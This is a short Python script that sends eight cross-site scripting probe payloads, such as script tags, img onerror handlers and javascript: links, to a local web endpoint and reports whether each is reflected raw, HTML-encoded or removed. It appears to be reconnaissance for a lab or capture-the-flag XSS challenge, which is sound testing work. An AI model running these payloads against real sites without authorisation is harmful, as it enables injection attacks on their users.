import requests
import re

# Target endpoint
url = "http://127.0.0.1:33081/page?name="

# Key test payloads (reduced set for reliability)
test_cases = [
    ("Plain text", "Test123"),
    ("HTML tag", "<b>BOLD</b>"),
    ("Script tag", "<script>alert(1)</script>"),
    ("Event handler", '<img src=x onerror=alert(1)>'),
    ("Attribute inj", '" onload=alert(1)>'),
    ("JS link", '<a href="javascript:alert(1)">link</a>'),
    ("Special chars", "<>\"'&"),
    ("Mixed XSS", '<img src=x onError=alert("XSS")>')
]

for test_name, payload in test_cases:
    print(f"\n=== Testing {test_name}: {payload}")
    
    try:
        resp = requests.get(url + payload, timeout=15)
        response = resp.text
        
        # Check reflection
        if payload in response:
            status = "RAW reflection found"
            idx = response.find(payload)
            snippet = response[max(0, idx-100):idx+len(payload)+50]
        else:
            # Check for HTML encoding
            import html
            escaped = html.escape(payload)
            if escaped in response:
                status = "HTML encoded reflection"
                idx = response.find(escaped)
                snippet = response[max(0, idx-100):idx+len(escaped)+50]
            else:
                status = "BLOCKED - payload removed"
                snippet = "N/A"
        
        print(f"Status: {resp.status_code}")
        print(f"Reflection: {status}")
        if snippet != "N/A":
            print(f"Snippet: {snippet[:300]}")
        
    except Exception as e:
        print(f"ERROR: {e}")

print("\n[+] Testing complete")
